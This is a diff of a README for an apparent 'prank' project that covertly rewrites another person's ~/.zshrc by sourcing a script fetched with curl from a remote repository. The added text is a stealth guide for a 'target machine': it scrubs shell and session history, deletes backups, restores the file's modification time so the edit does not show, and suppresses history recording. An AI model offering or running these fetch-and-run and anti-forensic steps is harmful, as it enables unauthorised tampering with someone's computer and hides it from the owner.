@@ -18,9 +18,20 @@ so the command itself is not saved to history:
 ```
  source <(curl -fsSL https://raw.githubusercontent.com/Motifman/prank-zshrc-zoo/main/train_remote.sh) virus.sed
 ```
-This scrubs the install traces from the history file and `~/.zsh_sessions`,
-and leaves no `prank-zshrc-zoo` directory behind. Keep your own clone as the
-base and `sh update.sh` to import the latest pranks.
+What it cleans up to stay undetectable:
+- No `prank-zshrc-zoo` directory is left on the target machine.
+- The `~/.zshrc.aonaon` sed backup is removed immediately.
+- `~/.zshrc` modification time is restored, so `ls -l` / Finder do not show a recent edit.
+- Install traces are scrubbed from the history file and `~/.zsh_sessions` (the
+  separate session history macOS Terminal.app keeps).
+
+Stealth tips:
+- The leading space matters: with `setopt HIST_IGNORE_SPACE` the command never
+  enters history in the first place. Confirm it is set before relying on it.
+- Or pre-disable session saving for that shell: `export SHELL_SESSIONS_DISABLE=1`.
+
+Keep your own clone as the base and `sh update.sh` to import the latest pranks.
+Out of scope: Time Machine / iCloud snapshots and network/proxy logs cannot be undone.
 
 ## One-Time virus 
 You need to use "source" instead of "zsh".
